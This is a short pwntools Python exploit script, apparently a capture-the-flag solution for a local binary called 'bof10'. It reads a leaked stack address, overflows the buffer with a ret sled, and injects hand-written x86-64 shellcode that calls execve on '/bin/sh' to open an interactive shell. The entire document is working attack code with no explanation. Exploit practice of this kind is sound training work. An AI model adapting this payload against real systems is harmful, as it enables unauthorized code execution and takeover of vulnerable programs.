from pwn import *

exe = ELF('./bof10', checksec=False)
r = process('./bof10')

r.sendlineafter(b'Your name: ', b'a'*8)
r.recvuntil(b'I have a gift for you: ')
leak = int(r.recvline(), 16)
log.info("leak: " + hex(leak))

ret = 0x0000000000401357
shellcode = asm(
    '''
    mov rax, 0x3b
    mov rdi, 29400045130965551
    push rdi
    
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    
    syscall
    ''', arch = 'amd64'
)
payload = p64(ret) * 59 + p64(leak - 48) + shellcode
payload = payload.ljust(512, b'a')
r.sendline(payload)

r.interactive()
